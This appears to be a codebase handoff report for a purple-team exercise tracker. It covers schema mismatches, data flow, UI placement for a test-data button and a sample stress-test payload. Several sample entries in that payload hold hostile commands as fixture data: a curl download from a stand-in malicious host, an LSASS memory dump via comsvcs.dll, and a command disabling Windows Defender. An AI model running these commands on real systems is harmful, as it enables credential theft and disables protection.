# Handoff Report — Explorer Stress M1

## Observation

We explored the codebase and analyzed the following files:
*   `src/AppContext.jsx` — State management, context, data loading, and CRUD method wrappers.
*   `src/components/ExerciseWizard.jsx` — Purple Team simulation scoping, payload generation, procedure mapping, and completion flow.
*   `src/components/GapTracker.jsx` — Kanban board for gaps and re-testing validation logic.
*   `src/components/Settings.jsx` — AI model settings, database connections, and manual backups.
*   `src/components/Dashboard.jsx` — Resilience metrics, MTTR, and historical campaign data charts.
*   `mock_database.js` — Mock server handling auth, raw data retrieval, and pagination/metrics aggregation.
*   `generate_synthetic_stress_data.js` — Offline script generating high-volume exercises and gaps.
*   `src/lib/db/core.js` — Interface contracts and instantiation factory.
*   `src/lib/db/adapters/RestApiAdapter.js` — Web client calling API backend endpoints.

### Verbatim Observations & Code Snippets

#### 1. Mismatch of "Campaign" vs "Simulation" Properties
In `generate_synthetic_stress_data.js` (lines 59, 107, 124), the exercises and gaps are generated with `campaign`:
```javascript
59:         campaign: `Stress Campaign ${i % 20 + 1}`,
107:         campaign: `Stress Campaign ${i % 20 + 1}`,
```
In `mock_database.js` (lines 532, 544, 709, 758), it relies on the `campaign` property:
```javascript
532:             const campaignsSet = new Set(db.exercises.map(ex => ex.campaign).filter(Boolean));
544:                 filtered = filtered.filter(ex => ex.campaign && ex.campaign.toLowerCase() === campaignQuery);
```
However, in `src/AppContext.jsx` (lines 684, 818) and `src/components/ExerciseWizard.jsx` (lines 605, 680, 695), the frontend uses `simulation` instead:
```javascript
684:         simulation: simulationName,
...
818:             if (targetTTPs.includes(ex.ttp) && ex.simulation === simulationName && (!procName || ex.finding === procName || !ex.finding)) {
```

#### 2. Exercise Object Structure
Defined in `AppContext.jsx` (lines 681-690):
```javascript
681:     const newExercise = {
682:         id: `ex-${Date.now()}`,
683:         ttp: ttp,
684:         simulation: simulationName,
685:         finding: finding,
686:         remediation: remediation,
687:         status: outcomeStatus,
688:         environment: envArray,
689:         date: new Date().toISOString()
690:     };
```

#### 3. Gap Object Structure
Created in `ExerciseWizard.jsx` (lines 692-705):
```javascript
692:              const newGap = {
693:                  id: Date.now() + Math.random(),
694:                  ttp: (p.ttps || []).join(', ') || 'Unmapped',
695:                  simulation: finalSimulationName,
696:                  finding: p.name || 'Unnamed Event',
697:                  details: `Execution: ${p.execNotes || 'N/A'}\nDetection: ${p.detNotes || 'N/A'}`,
698:                  severity: severity,
699:                  priorityScore: priorityScore,
700:                  status: 'Open',
701:                  actionItems: 'Review telemetry and develop detection logic.',
702:                  stakeholders: 'Detection Engineering',
703:                  environment: simulationDetails.environmentCategory,
704:                  createdDate: new Date().toISOString()
705:              };
```

#### 4. Simulation Summary Object Structure
Constructed in `ExerciseWizard.jsx` (lines 677-683):
```javascript
677:        const simulationPayloadData = {
678:            summary: compiledSummary,
679:            details: simulationDetails,
680:            attackChain: simulationPayload,
681:            testResults: finalizedTestResults,
682:            timestamp: new Date().toISOString()
683:        };
```
Where `finalizedTestResults` elements contain:
*   `id`: number/string
*   `name`: string
*   `ttps`: array of strings
*   `eventType`: string
*   `payloadCode`: string
*   `expectedOutcome`: string
*   `outcome`: string
*   `coverageRating`: string
*   `execNotes`: string
*   `detNotes`: string
*   `severity`: string
*   `evidence`: array of base64 strings (optional)

---

## Logic Chain

1. **Frontend-Backend Contract Mismatch**: 
   *   *Observation 1* shows that frontend state management expects `simulation` as the property name for linking exercises/gaps to a simulation campaign, whereas the backend metrics `/api/metrics`, campaign listing `/api/campaigns`, and query filter `/api/exercises` expect `campaign`.
   *   This mismatch leads to database aggregation and listing issues when the app runs against `RestApiAdapter` compared to `LocalStorageAdapter`. 

2. **Database Adapter Data Flow**:
   *   `src/lib/db/core.js` declares abstract contracts for `fetchExercises`, `createExercise`, `fetchGaps`, `createGap`, `updateGap`, `deleteGap`, and `fetchMitreCoverage`.
   *   `RestApiAdapter.js` implements these via direct HTTP REST operations (e.g., `GET /api/exercises`, `POST /api/exercises`, `GET /api/gaps`, etc.).
   *   In contrast, `LocalStorageAdapter.js` falls back on `fetchData` and `saveData` on keys such as `exercises` and `gaps` since it lacks granular methods.
   *   `AppContext.jsx` intercepts calls and uses conditional checks (`typeof dbAdapter.fetchExercises === 'function'`) to determine whether to call granular adapter methods or bulk-save/load key-value pairs (lines 252-282, 307-333, 637-649, 692-700, 815-849).

3. **Chaos Data Schema Ingestion**:
   *   To perform high-volume stress tests (50+ events), we need to recommend a simulation payload structure that embeds chaotic data points. 
   *   This includes: null or empty arrays, undefined fields, out-of-sync timestamps, impossible status-severity correlations (e.g. `status: 'high'` but `severity: 'Critical'`), and malformed dates.
   *   This helps verify the robustness of frontend aggregations (e.g. `getAggregatedScore` in `ExerciseWizard.jsx` and status rollups in `AppContext.jsx`) when encountering corrupt or unexpected payloads.

4. **Integration Point Selection**:
   *   *Dashboard.jsx* (line 368) has a right-aligned flex block for connection status badges. Integrating a dev-only "Inject Test Data" button here allows instant UI validation but risks cluttered look.
   *   *Settings.jsx* (line 432) under "Database & Sync" contains action buttons for data migration. Integrating the button here keeps the production dashboard interface clean while localizing database actions.

---

## Caveats

*   **Firebase / Supabase Implementations**: The `FirebaseAdapter` is currently a stub that throws exceptions. The `SupabaseAdapter` maps granular PostgreSQL tables but relies on server RPCs (`get_distinct_simulations`, `get_mitre_coverage`) which are not present in the local file system.
*   **Permissions**: Deleting exercises lacks a granular backend endpoint in `mock_database.js` (only the entire database key `exercises` can be cleared).

---

## Conclusion

### 1. Schema Specifications

#### Exercises
| Field | Frontend Type | Backend Type (`mock_database.js` / Synthetic Data) |
|---|---|---|
| `id` | string (`ex-${Date.now()}`) | number / string |
| `ttp` | string | string |
| `simulation` | string (Simulation Name) | *Mismatched* (maps to `campaign` in backend) |
| `finding` | string | string |
| `remediation` | string | string |
| `status` | string (`high`/`medium`/`minimal`/`low`/`na`) | string |
| `environment` | Array of strings | Array of strings |
| `date` | string (ISO Date) | string (ISO Date / Null / Empty) |

#### Gaps
| Field | Frontend Type | Backend Type |
|---|---|---|
| `id` | number / string | number / string |
| `ttp` | string (comma-separated list) | string (comma-separated list) |
| `simulation` | string | *Mismatched* (maps to `campaign` in backend) |
| `finding` | string | string |
| `details` | string | string |
| `severity` | string (`Critical`/`High`/`Medium`/`Low`) | string |
| `priorityScore` | number (0-100) | number (0-100) |
| `status` | string (`Open`/`In Progress`/`Resolved`) | string (`Open`/`In Progress`/`Resolved`/`Risk Accepted`) |
| `actionItems` | string | string |
| `stakeholders` | string | Array of strings (`['Detection Engineering']`) |
| `environment` | Array of strings | Array of strings |
| `createdDate` | string (ISO Date) | string (ISO Date) |
| `resolvedDate` | string (ISO Date / Null) | string (ISO Date / Null) |

#### Simulation Summary
Stored in `simulationSummaries` state. It maps to the key `simulationSummaries` (frontend) / `campaignSummaries` (backend).
Key: `[Simulation Name]` (string)
Value:
```json
{
  "summary": "## Executive Summary...",
  "details": {
    "name": "Simulation Name",
    "environmentCategory": ["Linux"],
    "environment": "Linux Server Host",
    "goals": "Goals of the exercise",
    "participants": [{ "id": 1, "name": "Analyst", "role": "Purple Team" }]
  },
  "attackChain": "Attack Chain Markdown",
  "testResults": [
    {
      "id": 1234567,
      "name": "Event Name",
      "ttps": ["T1059.001"],
      "eventType": "Payload",
      "payloadCode": "powershell.exe -c ...",
      "expectedOutcome": "Prevented",
      "outcome": "Logged ✓ Validated",
      "coverageRating": "Partial",
      "execNotes": "Notes",
      "detNotes": "Notes",
      "severity": "High",
      "evidence": ["data:image/jpeg;base64,..."]
    }
  ],
  "timestamp": "ISO Date"
}
```

---

### 2. Recommended Format for a "Stress Test" Ingestion Payload

To properly stress-test the metrics engine and UI components, we recommend generating a payload representing a simulation of **50+ chaotic events**.

#### Recommended MITRE ATT&CK TTPs (15 Selected)
*   **Initial Access**: `T1566.001` (Spearphishing Attachment), `T1190` (Exploit Public-Facing Application)
*   **Execution**: `T1059.001` (PowerShell), `T1059.003` (Windows Command Shell), `T1204.002` (Malicious File)
*   **Persistence**: `T1053.005` (Scheduled Task), `T1543.003` (Windows Service)
*   **Defense Evasion**: `T1562.001` (Disable/Modify Tools), `T1070.004` (File Deletion)
*   **Credential Access**: `T1003.001` (LSASS Memory), `T1110.001` (Password Guessing)
*   **Discovery**: `T1082` (System Information Discovery), `T1016` (System Network Configuration Discovery)
*   **Command and Control**: `T1071.001` (Web Protocols)
*   **Impact**: `T1486` (Data Encrypted for Impact)

#### Structure Containing Chaotic Edge Cases (Snippet Example)
```json
{
  "summary": "## Stress Test Summary\nChaotic payload testing metrics resiliency.",
  "details": {
    "name": "Chaos Stress Simulation 50+",
    "environmentCategory": ["Windows Server", "Linux"],
    "environment": "Stress Host Network",
    "goals": "Evaluate UI performance and parser tolerance for corrupt telemetry.",
    "participants": [
      { "id": 1, "name": "Chaos Agent", "role": "Purple Team" }
    ]
  },
  "attackChain": "Simulated chaos stream",
  "timestamp": "2026-06-17T18:41:00.000Z",
  "testResults": [
    {
      "id": "chaos-01",
      "name": "Event 1 - Normal Prevented",
      "ttps": ["T1059.001"],
      "eventType": "Payload",
      "payloadCode": "powershell.exe -c Write-Host 'Normal'",
      "expectedOutcome": "Prevented",
      "outcome": "Prevented",
      "coverageRating": "Optimal",
      "execNotes": "Standard EDR prevention check",
      "detNotes": "Blocked immediately",
      "severity": "N/A"
    },
    {
      "id": "chaos-02",
      "name": "Event 2 - N/A Outcome Edge Case",
      "ttps": ["T1566.001"],
      "eventType": "Payload",
      "payloadCode": "curl http://malicious.domain/payload",
      "expectedOutcome": "N/A",
      "outcome": "N/A",
      "coverageRating": "N/A",
      "execNotes": "Host was offline, test skipped.",
      "detNotes": "No alert generated",
      "severity": "N/A"
    },
    {
      "id": "chaos-03",
      "name": "Event 3 - Empty TTPs Array",
      "ttps": [],
      "eventType": "Payload",
      "payloadCode": "whoami",
      "expectedOutcome": "Logged",
      "outcome": "Logged",
      "coverageRating": "Partial",
      "execNotes": "Executed local enumeration command",
      "detNotes": "Telemetry found in process creation logs",
      "severity": "Low"
    },
    {
      "id": "chaos-04",
      "name": "Event 4 - Undefined Severity & Auto-Calculate",
      "ttps": ["T1003.001"],
      "eventType": "Payload",
      "payloadCode": "rundll32.exe comsvcs.dll, MiniDump",
      "expectedOutcome": "Alerted",
      "outcome": "Missed",
      "coverageRating": "Zero",
      "execNotes": "Dumped LSASS memory using comsvcs.dll",
      "detNotes": "EDR sensor failed to hook the comsvcs API",
      "severity": "Auto-Calculate"
    },
    {
      "id": "chaos-05",
      "name": "Event 5 - Impossible Combination: Optimal and Critical",
      "ttps": ["T1486"],
      "eventType": "Payload",
      "payloadCode": "benign-ransomware-mock.exe",
      "expectedOutcome": "Prevented",
      "outcome": "Prevented ✓ Validated",
      "coverageRating": "Optimal",
      "execNotes": "Simulation blocked before file encryption.",
      "detNotes": "Heuristics triggered block",
      "severity": "Critical"
    },
    {
      "id": "chaos-06",
      "name": "Event 6 - Error status",
      "ttps": ["T1190"],
      "eventType": "Payload",
      "payloadCode": "exploit-payload-cve",
      "expectedOutcome": "Prevented",
      "outcome": "Error",
      "coverageRating": "N/A",
      "execNotes": "Exploit crashed target service, environment corrupt.",
      "detNotes": "Target host became unresponsive",
      "severity": "High"
    },
    {
      "id": "chaos-07",
      "name": "",
      "ttps": ["T1562.001"],
      "eventType": "Payload",
      "payloadCode": "sc.exe config WinDefend start= disabled",
      "expectedOutcome": "Prevented",
      "outcome": "Missed",
      "coverageRating": "None",
      "execNotes": "Stopped Defender service",
      "detNotes": "",
      "severity": "Critical"
    }
  ]
}
```

---

### 3. UI Integration Locations

#### Option A: Global Settings View (`src/components/Settings.jsx`)
Integrating the button inside the "Database & Sync" panel next to the Export/Import buttons keeps the dev-tool hidden from normal workspace views.

*   **Location**: Line 438, inside the action button container block.
*   **Snippet Context**:
```javascript
432:              <div style={{ display: 'flex', gap: '15px', alignItems: 'center' }}>
433:                  <button className="btn hover-lift" onClick={() => { setPasswordAction('export'); setPasswordModalOpen(true); }} style={{ display: 'flex', alignItems: 'center', gap: '8px', background: 'rgba(255,255,255,0.05)', border: '1px solid var(--glass-border)' }}>
434:                      <Save size={16} /> Export Backup
435:                  </button>
436:                  <button className="btn hover-lift" onClick={() => document.getElementById('db-import-input').click()} style={{ display: 'flex', alignItems: 'center', gap: '8px', background: 'rgba(255,255,255,0.05)', border: '1px solid var(--glass-border)' }}>
437:                      <Upload size={16} /> Import / Migrate Backup
438:                  </button>
439:                  {/* Proposed Integration Point */}
440:                  <button className="btn hover-lift" onClick={injectTestData} style={{ display: 'flex', alignItems: 'center', gap: '8px', background: 'rgba(126, 34, 206, 0.2)', border: '1px solid var(--accent-primary)', color: 'var(--accent-primary)' }}>
441:                      <DatabaseIcon size={16} /> Inject Test Data
442:                  </button>
443:                  <input type="file" id="db-import-input" accept=".enc,.json" style={{ display: 'none' }} onChange={handleImportSelect} />
444:              </div>
```

#### Option B: Global Dashboard View (`src/components/Dashboard.jsx`)
Integrating the button in the header right-side action panel permits fast verification of metrics updates directly on the dashboard charts.

*   **Location**: Line 380, immediately following the AI Integration status badge.
*   **Snippet Context**:
```javascript
376:            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '8px 16px', background: 'rgba(10,11,16,0.6)', border: `1px solid ${!!aiSettings?.apiKey ? 'rgba(16,185,129,0.3)' : 'rgba(255,255,255,0.1)'}`, borderRadius: '24px', boxShadow: !!aiSettings?.apiKey ? '0 0 10px rgba(16,185,129,0.2)' : 'none' }}>
377:               <Activity size={16} color={!!aiSettings?.apiKey ? 'var(--success)' : 'var(--text-muted)'} />
378:               <span style={{ fontSize: '0.85rem', color: !!aiSettings?.apiKey ? 'var(--success)' : 'var(--text-muted)', fontWeight: 'bold' }}>{!!aiSettings?.apiKey ? 'AI Integration: ONLINE' : 'AI Integration: OFFLINE'}</span>
379:            </div>
380:            {/* Proposed Integration Point */}
381:            <button className="btn hover-lift" onClick={injectTestData} style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '8px 16px', background: 'rgba(126, 34, 206, 0.2)', border: '1px solid var(--accent-primary)', borderRadius: '24px', fontSize: '0.85rem', color: 'var(--accent-primary)', fontWeight: 'bold' }}>
382:                <Database size={16} /> Inject Test Data
383:            </button>
384:         </div>
385:       </div>
```

---

### 4. Backend Endpoints and State Flow

#### Data Fetching, Saving, and Deletion flow

1.  **Exercises Fetching**:
    *   *Frontend Context Trigger*: `fetchExercisesPage()` in `AppContext.jsx` executes.
    *   *Adapter Call*: Calls `dbAdapter.fetchExercises(page, limit, simulation)`.
    *   *REST API Endpoint*: Triggers `GET /api/exercises?page=${page}&limit=${limit}&simulation=${simulation}&sort=date&order=desc`.
    *   *Mock Database Method*: Routed to `/api/exercises` `GET` endpoint, which reads from memory `db.exercises`, filters on query campaign parameter, sorts by date, slices based on page/limit boundaries, and returns:
        ```json
        {
          "data": [...],
          "total": 10500,
          "page": 1,
          "limit": 50
        }
        ```
    *   *Fallback Path*: If not using `RestApiAdapter`, calls `dbAdapter.fetchData('exercises')` which defaults to `localStorage.getItem('exercises')`.

2.  **Exercises Saving**:
    *   *Frontend Context Trigger*: `completeExercise()` inside `AppContext.jsx` is fired.
    *   *Adapter Call*: Calls `dbAdapter.createExercise(newExercise)`.
    *   *REST API Endpoint*: Triggers `POST /api/exercises` with the JSON payload representing the exercise.
    *   *Mock Database Method*: Inside `/api/exercises` `POST` handler, pushes body to `db.exercises` list.
    *   *Fallback Path*: Calls `dbAdapter.saveData('exercises', next)`.

3.  **Exercises Deletion**:
    *   *Trigger*: There is no direct single exercise deletion endpoint or method in `DatabaseAdapter`.
    *   *Mock Database Method*: Supported only via `DELETE /data/exercises` which clears `db.exercises = []` (wiping the full list in database).

4.  **State Sync & Rollup Pipeline**:
    ```
    Exercise Wizard (Submit)
      └──> completeExercise() [AppContext]
             ├──> dbAdapter.createExercise() ──> POST /api/exercises [RestApiAdapter]
             └──> loadMitreCoverage() [AppContext]
                    └──> dbAdapter.fetchMitreCoverage() ──> GET /api/mitre-coverage [RestApiAdapter]
                           └──> calculateMitreCoverage() [mock_database.js]
                                  └──> recalculateMitreStatuses() [mock_database.js]
                                         └──> returns aggregated JSON matrix ──> setMitreData() [AppContext]
    ```

---

## Verification Method

1.  **Codebase Inspection**:
    *   Open `src/AppContext.jsx` and look at lines 252-287 to verify conditional pagination calls.
    *   Open `mock_database.js` at line 72 to verify the mapping of `campaignSummaries` versus `simulationSummaries` to find the contract discrepancy.
2.  **Headless E2E Test Execution**:
    *   Propose running `npm run test:e2e` inside a terminal command to verify that all existing tests pass under the current local configuration.
3.  **Validation Check**:
    *   Verify that adding the `injectTestData` method inside the chosen UI view successfully triggers state updates in `AppContext` and forces the dashboard cards to update their resolution rates.
